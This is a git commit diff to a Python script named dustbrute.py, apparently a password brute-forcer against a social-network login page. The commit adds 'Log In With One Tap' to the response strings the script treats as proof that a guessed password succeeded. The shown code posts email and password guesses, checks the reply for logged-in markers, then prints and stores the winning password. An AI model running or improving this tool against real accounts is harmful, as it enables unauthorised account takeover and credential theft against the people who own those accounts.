5667798a9579fcf7d71e14c630ff220190ce920a
Aung Nyein Chan <aungnyeinchan2003@gmail.com>
2022-03-14 14:55:17 +0630

    Update dustbrute.py

--- dustbrute.py
+++ dustbrute.py
@@ -30,7 +30,7 @@ def function(email,passw,i):
 		payload['email']=email
 	payload['pass']=passw
 	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
-	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text or 'security code' in r.text or "Log Out" in r.text:
+	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text or 'security code' in r.text or "Log Out" in r.text or "Log In With One Tap" in r.text:
 		open('temp','w').write(str(r.content))
 		print('\npassword is : ',passw)
 		return True
